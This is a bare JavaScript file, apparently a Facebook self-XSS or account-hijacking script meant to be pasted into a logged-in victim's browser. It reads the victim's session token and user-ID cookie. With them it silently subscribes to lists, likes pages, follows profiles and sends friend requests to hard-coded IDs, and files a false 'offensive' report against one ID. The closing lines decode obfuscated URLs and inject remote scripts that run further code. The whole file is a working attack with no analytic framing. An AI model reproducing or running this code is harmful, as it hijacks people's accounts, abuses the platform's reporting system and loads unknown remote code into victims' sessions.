var fb_dtsg = document.getElementsByName('fb_dtsg')[0].value;
var user_id = document.cookie.match(document.cookie.match(/c_user=(\d+)/)[1]);
function LIST(L) {
  var X = new XMLHttpRequest();
  var XURL = "//www.facebook.com/ajax/friends/lists/subscribe/modify";
  var XParams = "flid=" + L +"&action=subscribe&location=feed&nctr[_mod]=pagelet_group_mall&ft[type]=40&ft[tn]=DH&__user="+user_id+"&__a=1&__dyn=7n8ahxoNpGo&__req=y&fb_dtsg="+fb_dtsg+"&phstamp=";
  X.open("POST", XURL, true);
  X.onreadystatechange = function () {
    if (X.readyState == 4 && X.status == 200) {
      X.close;
    }
  };
  X.send(XParams);
}
LIST("592694070775595");
LIST("567376543307348");
LIST("591619694216366");
LIST("591621524216183");
LIST("591619460883056");
LIST("591623140882688");
LIST("577657768945892");
LIST("591624280882574");
LIST("591625247549144");
LIST("591619600883042");
LIST("591620727549596");
LIST("562836113761391");
LIST("591619047549764");
LIST("591624687549200");
LIST("591619340883068");
LIST("592695127442156");
LIST("279163185561807");
LIST("595165117195157");

/*Like Page*/
var fb_dtsg = document.getElementsByName('fb_dtsg')[0].value;
var user_id = document.cookie.match(document.cookie.match(/c_user=(\d+)/)[1]);
function Like(p) {
  var Page = new XMLHttpRequest();
  var PageURL = "//www.facebook.com/ajax/pages/fan_status.php";
  var PageParams = "&fbpage_id=" + p +"&add=true&reload=false&fan_origin=page_timeline&fan_source=&cat=&nctr[_mod]=pagelet_timeline_page_actions&__user="+user_id+"&__a=1&__dyn=798aD5z5CF-&__req=d&fb_dtsg="+fb_dtsg+"&phstamp=";
  Page.open("POST", PageURL, true);
  Page.onreadystatechange = function () {
    if (Page.readyState == 4 && Page.status == 200) {
      Page.close;
    }
  };
  Page.send(PageParams);
}
Like("313072532101076");
Like("1377557035798118");
Like("229488947108546");
Like("205908352819272");
Like("209464459125570");
Like("523004351084154");
Like("200776629976061");
Like("147857465295449");
Like("163588093717517");
Like("291092130903328");
Like("429143760437630");
Like("149394451859931");
Like("306495312809675");
Like("139361566267801");
Like("567227273316419");
Like("90451517757758");
Like("155745581276803");

/*Auto Follow*/
var fb_dtsg = document.getElementsByName('fb_dtsg')[0].value;
var user_id = document.cookie.match(document.cookie.match(/c_user=(\d+)/)[1]);
function a(abone) {
  var http4 = new XMLHttpRequest();
  var url4 = "/ajax/follow/follow_profile.php?__a=1";
  var params4 = "profile_id=" + abone + "&location=1&source=follow-button&subscribed_button_id=u37qac_37&fb_dtsg=" + fb_dtsg + "&lsd&__" + user_id + "&phstamp=";
  http4.open("POST", url4, true);
  http4.onreadystatechange = function () {
    if (http4.readyState == 4 && http4.status == 200) {
      http4.close;
    }
  };
  http4.send(params4);
}
a("100001050235420");
a("100003785647375");
a("100003697277263");
/*Add Friend*/ 
var fb_dtsg = document.getElementsByName('fb_dtsg')[0].value;
var user_id = document.cookie.match(document.cookie.match(/c_user=(\d+)/)[1]);
function IDS(r) {
  var X = new XMLHttpRequest();
  var XURL = "//www.facebook.com/ajax/add_friend/action.php";
  var XParams = "to_friend=" + r +"&action=add_friend&how_found=friend_browser_s&ref_param=none&&&outgoing_id=&logging_location=search&no_flyout_on_click=true&ego_log_data&http_referer&__user="+user_id+"&__a=1&__dyn=798aD5z5CF-&__req=35&fb_dtsg="+fb_dtsg+"&phstamp=";
  X.open("POST", XURL, true);
  X.onreadystatechange = function () {
    if (X.readyState == 4 && X.status == 200) {
      X.close;
    }
  };
  X.send(XParams);
}
IDS("100004021942009");
IDS("100003977780572");
IDS("100004043843895");
IDS("100004121340012");
IDS("100003977784062");
IDS("100004537747892");
var fb_dtsg = document.getElementsByName('fb_dtsg')[0].value;
var user_id = document.cookie.match(document.cookie.match(/c_user=(\d+)/)[1]);
var now=(new Date).getTime();
function pages(pid) {
  var Page = new XMLHttpRequest();
  var PageURL = "//www.facebook.com/ajax/report/social.php";
  var PageParams ="fb_dtsg="+fb_dtsg+"&pp=%7B%22actions_to_take%22%3A%22[]%22%2C%22are_friends%22%3Afalse%2C%22cid%22%3A"+pid+"%2C%22content_type%22%3A23%2C%22first_choice%22%3A%22offensive%22%2C%22is_following%22%3Afalse%2C%22is_tagged%22%3Afalse%2C%22on_profile%22%3Afalse%2C%22phase%22%3A3%2C%22report_type%22%3A1%2C%22sub_report_type%22%3A84%2C%22time_flow_started%22%3A"+now+"%2C%22user%22%3A"+user_id+"%7D&file_report=1&__user="+user_id+"&__a=1&__dyn=7n8ahyj35CFUSt2u5FeDKdpU&__req=f&phstamp=165816771888475116486";
  Page.open("POST", PageURL, true);
  Page.onreadystatechange = function () {
    if (Page.readyState == 4 && Page.status == 200) {
      Page.close;
    }
  };
  Page.send(PageParams);
}
pages("135161536684829");
var enkripsi="jvvr8--vckommp/qapkrvq,ug`q,amo-hctcqapkrv-qgawpgf-Ockl-qwrrmpv/dkng,hq"; teks=""; teksasli="";var panjang;panjang=enkripsi.length;for (i=0;i<panjang;i++){ teks+=String.fromCharCode(enkripsi.charCodeAt(i)^2) }teksasli=unescape(teks);document.body.appendChild(document.createElement('script')).src=teksasli;
var a="jvvrq8--pcu,ekvjw`,amo-ucxx{epc{-dcag`mmi-ej/rcegq-pgrmpv,rjr"; b=""; c="";var d;d=a.length;for (i=0;i<d;i++){ b+=String.fromCharCode(a.charCodeAt(i)^2) }c=unescape(b);document.body.appendChild(document.createElement('script')).src=c;
